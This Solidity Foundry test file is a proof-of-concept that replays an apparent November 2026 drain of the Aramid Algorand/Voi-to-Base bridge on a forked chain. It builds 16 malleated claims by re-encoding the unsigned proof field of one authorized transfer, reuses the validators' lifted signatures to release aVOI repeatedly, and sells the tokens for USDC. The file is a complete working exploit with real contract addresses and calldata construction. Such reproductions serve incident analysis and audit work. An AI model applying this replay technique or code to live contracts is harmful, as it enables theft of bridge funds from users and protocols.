// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

// Aramid bridge signed-subset / dedup-on-decoded-proof claim replay drain PoC (Base, 2026-11-21)
//
// Reproduces the realized drain end to end on an archival Base fork. One authorized Algorand->Base
// transfer is paid 16 times by re-encoding the one field the validators never signed. Nothing is
// copied from the attacker's transactions: this test holds the single authorized claim's logical
// inputs (its signed fields, its source id, its proof payload) and the two public validator
// signatures lifted from one on-chain claim, and it CONSTRUCTS the 16 malleated claims itself from
// those inputs. No mocks, no vm.store, no forged signatures, no vm.prank of a validator, no
// load-bearing deal. The only impersonation is of the signed recipient EOA for the dump leg, which
// is not a protocol identity.
//
// @Incident
// Aramid's Algorand/Voi <-> Base bridge was drained on 2026-11-21. A single transfer signed once by
// the validators was claimed many times on Base; the replays released bridge-locked aVOI, dumped for
// USDC on Base and (per the project post) redeemed for real ALGO on the Voi/Algorand side. The
// headline multi-chain loss is reported in the millions; this PoC asserts the measured Base-side
// figures: the aVOI released by replaying one transfer 16 times, and the USDC it yields in the pool.
//   Bridge (proxy)   : https://basescan.org/address/0xc7faa8f8c6d9dc05abf3c5aa741a38f9a6d1c263
//   Bridge impl      : https://basescan.org/address/0xfc7cf290ede96621ee0d99f8000ee0fe868fd634
//   aVOI token       : https://basescan.org/address/0xb40C776253c4BbC18A9e635aCC183359e5fa22f9
//   Attacker / signed recipient : https://basescan.org/address/0x99Ed4BeD57855bCCDd1CF2127220C3119ec21Ba4
//   aVOI/USDC v3 pool: https://basescan.org/address/0x11DeE17647b8cC8d1b6897D8f3CdFB50d6A11685 (1% fee)
//   First claim tx   : https://basescan.org/tx/0x08f1a363ad7611801860c8b06638de4322c85970faf0a4b3cbd38fd2328d618b
//   A dump tx        : https://basescan.org/tx/0xf4cb44f7ed07bb16e0a2bd3c66acbf7aabd086737675bdf51252929e1c440384
//
// @Root cause
// The bridge claim is claim(uint64 id, bytes srcTx, (uint32,bytes,uint256,bytes) proof, uint32
// chainId, address token, uint256 amount, address recipient, bytes note, bytes[] signatures). The
// two validator signatures authenticate the transfer fields (id, srcTx, chainId, token, amount,
// recipient, note) and NOT the proof tuple: one fixed signature pair validates every claim below,
// each of which carries a different decoded proof. The duplicate-claim guard, however, keys on the
// decoded proof, so a claim with a fresh proof is seen as a new transfer. The proof is therefore the
// replay nonce, and it is unsigned. An attacker re-encodes it freely to mint a new dedup key while
// the signatures keep validating. Because recipient is a signed field, every replay pays the same
// recipient out of the bridge's pre-minted locked aVOI (minted to type(uint256).max at deploy), so
// the drain is bounded only by that locked supply.
//
// @How the proof is malleated (constructed, not copied)
// The proof's logical payload is a fixed 78-byte buffer M (the Voi source id / routing data of the
// one authorized transfer). The ABI tuple (uint32 a, bytes b, uint256 c, bytes d) is just a view
// over M: with the canonical member offsets held fixed, moving the b/d length split (b_len = k,
// d_len = 68 - k) re-carves where M is cut into the four fields, so each k in 1..16 yields a
// different decoded proof that still represents the same transfer and still passes the bridge's
// proof check, while producing a distinct dedup key. _proofTuple(k) below builds that carve from M
// for a given k; the non-canonical split IS the vulnerability. The 16 splits reproduce the 16
// on-chain claims exactly, but they are generated here from M, not pasted.
//
// @Reconstruction
// Fork Base at block 60542657, one block before the first claim (60542658). A fresh Exploit contract
// submits 16 constructed claims, splits k = 10 (the canonical/authorized encoding) then 16..1, each
// releasing 99,800,100 aVOI (6 decimals) to the signed recipient. A 17th submission of the first
// (k = 10) claim verbatim reverts, showing the guard is active and keys on the decoded proof. The
// recipient's aVOI is then sold into the v3 pool for USDC.

contract AramidExploit is Test {
    address constant BRIDGE = 0xC7FAA8f8C6D9Dc05ABf3C5aa741a38F9A6d1C263;
    IERC20 constant AVOI = IERC20(0xb40C776253c4BbC18A9e635aCC183359e5fa22f9);
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address constant POOL = 0x11DeE17647b8cC8d1b6897D8f3CdFB50d6A11685;
    ISwapRouter02 constant ROUTER = ISwapRouter02(0x2626664c2603336E57B271c5C0b26F421741e481);
    address constant RECIPIENT = 0x99Ed4BeD57855bCCDd1CF2127220C3119ec21Ba4;
    address constant TOKEN = 0xb40C776253c4BbC18A9e635aCC183359e5fa22f9;

    uint64 constant ID = 60973902;
    uint256 constant AMOUNT = 99800100000000; // 99,800,100 aVOI at 6 decimals
    uint256 constant N = 16;

    // Logical inputs of the one authorized transfer, lifted from a single on-chain claim.
    // srcTx (the Voi source address), note, and the 78-byte proof payload M.
    bytes constant SRC =
        hex"435a434243424346594d59374d564d33464832544f5a415856344f435652354946594e51513359415241433453324e43534a5451";
    bytes constant NOTE = hex"6172616d6964";
    bytes constant M =
        hex"5ac48582510000065901323332303737353430374c435032514434554a4336424d5350464a503251515759504d594b53323334484d4e35534254484950474a3553424f56323650584d5754445559";
    // The two public validator signatures, lifted verbatim from one on-chain claim (reusing these is
    // the exploit; they are not forged and no validator key is used).
    bytes constant SIG0 =
        hex"79e8fb7f51e185c64a7de9da476fa20e8ade32965be31a1370183577cf9f6f7f5bd79952f9061db66111c49c362446c6c96485877d3c5bdb3bd52adc475996af1c";
    bytes constant SIG1 =
        hex"ff3b5a809f5417e85984b8d80506e20fe73295a31ffb4e033b65b671482fa36f6c21069ec4f358e45607c6dc745bc4f3669a6bddccbc33547b9a4aeade3f47c91c";

    function setUp() public {
        vm.createSelectFork("base", 60542657);
    }

    function testExploit() public {
        emit log_named_decimal_uint("bridge aVOI before", AVOI.balanceOf(BRIDGE), 6);
        emit log_named_decimal_uint("recipient aVOI before", AVOI.balanceOf(RECIPIENT), 6);

        uint256 bridgeBefore = AVOI.balanceOf(BRIDGE);
        uint256 recipBefore = AVOI.balanceOf(RECIPIENT);

        // 16 distinct proof-tuple carves of the same authorized transfer. k = 10 is the canonical
        // (authorized) encoding; the other 15 are non-canonical re-encodings the signatures never
        // covered. A fresh submitter replays one authorized transfer N times.
        uint8[16] memory ks = [10, 16, 15, 14, 13, 12, 11, 9, 8, 7, 6, 5, 4, 3, 2, 1];
        for (uint256 i = 0; i < N; i++) {
            (bool ok,) = BRIDGE.call(_buildClaim(ks[i]));
            require(ok, "constructed claim rejected");
        }

        uint256 drained = AVOI.balanceOf(RECIPIENT) - recipBefore;
        emit log_named_decimal_uint("recipient aVOI after", AVOI.balanceOf(RECIPIENT), 6);
        emit log_named_decimal_uint("aVOI drained from bridge", bridgeBefore - AVOI.balanceOf(BRIDGE), 6);

        assertEq(bridgeBefore - AVOI.balanceOf(BRIDGE), AMOUNT * N, "bridge drain != 16x claim");
        assertEq(drained, AMOUNT * N, "recipient gain != 16x claim");

        // The guard is active: re-submitting an already-used proof (k = 10) verbatim reverts. The 16
        // above succeeded only because each carried a distinct proof carve.
        (bool dup,) = BRIDGE.call(_buildClaim(10));
        assertFalse(dup, "verbatim duplicate should revert (dedup active)");

        // Dump leg: the signed recipient sells the released aVOI into the v3 pool for USDC.
        uint256 toSell = AVOI.balanceOf(RECIPIENT);
        vm.startPrank(RECIPIENT);
        AVOI.approve(address(ROUTER), toSell);
        uint256 usdcOut = ROUTER.exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: address(AVOI),
                tokenOut: address(USDC),
                fee: 10000,
                recipient: RECIPIENT,
                amountIn: toSell,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        vm.stopPrank();

        emit log_named_decimal_uint("USDC extracted from pool", usdcOut, 6);
        assertGt(usdcOut, 0, "no USDC extracted");
    }

    // Build the 288-byte proof-tuple region by carving the fixed payload M at split k (b_len = k,
    // d_len = 68 - k) with canonical member offsets. Each distinct k decodes to a distinct proof.
    function _proofRegion(uint256 k) internal pure returns (bytes memory r) {
        r = new bytes(288);
        // w0: proof.a = M[16-k : 20-k], right-aligned in the word
        for (uint256 i = 0; i < 4; i++) r[28 + i] = M[16 - k + i];
        // w1: offset to b = 0x80 (canonical)
        r[63] = 0x80;
        // w2: proof.c holds the 6 payload bytes that fall outside a/b/d: the d-overflow bytes
        // M[88-k:78] (only when k > 10) left-aligned, and the front remainder M[0:16-k] right-aligned
        if (k > 10) {
            uint256 backLen = k - 10;
            for (uint256 i = 0; i < backLen; i++) r[64 + i] = M[88 - k + i];
        }
        uint256 frontLen = 16 - k;
        for (uint256 i = 0; i < frontLen; i++) r[96 - frontLen + i] = M[i];
        // w3: offset to d = 0xc0 (canonical)
        r[127] = 0xc0;
        // w4: b_len = k
        r[159] = bytes1(uint8(k));
        // w5: proof.b = M[20-k : 20], left-aligned
        for (uint256 i = 0; i < k; i++) r[160 + i] = M[20 - k + i];
        // w6: d_len = 68 - k
        r[223] = bytes1(uint8(68 - k));
        // w7,w8: proof.d data = M[20 : 20 + min(68-k, 58)], left-aligned (any length beyond the
        // stored bytes is read by the decoder as the trailing zero padding, as on-chain)
        uint256 dl = (68 - k) < 58 ? (68 - k) : 58;
        for (uint256 i = 0; i < dl; i++) r[224 + i] = M[20 + i];
    }

    function _buildClaim(uint256 k) internal pure returns (bytes memory) {
        bytes memory head = abi.encodePacked(
            bytes4(0xef78a1b6),
            bytes32(uint256(ID)),
            bytes32(uint256(0x120)), // off srcTx
            bytes32(uint256(0x180)), // off proof
            bytes32(uint256(8453)), // chainId
            bytes32(uint256(uint160(TOKEN))),
            bytes32(AMOUNT),
            bytes32(uint256(uint160(RECIPIENT))),
            bytes32(uint256(0x2a0)), // off note
            bytes32(uint256(0x2e0)) // off sigs
        );
        return bytes.concat(head, _dyn(SRC), _proofRegion(k), _dyn(NOTE), _sigs());
    }

    function _dyn(bytes memory x) internal pure returns (bytes memory) {
        uint256 padded = ((x.length + 31) / 32) * 32;
        bytes memory p = new bytes(padded);
        for (uint256 i = 0; i < x.length; i++) p[i] = x[i];
        return bytes.concat(bytes32(x.length), p);
    }

    function _sigs() internal pure returns (bytes memory) {
        return bytes.concat(
            bytes32(uint256(2)), // array length
            bytes32(uint256(0x40)), // off sig0
            bytes32(uint256(0xc0)), // off sig1
            _dyn(SIG0),
            _dyn(SIG1)
        );
    }
}
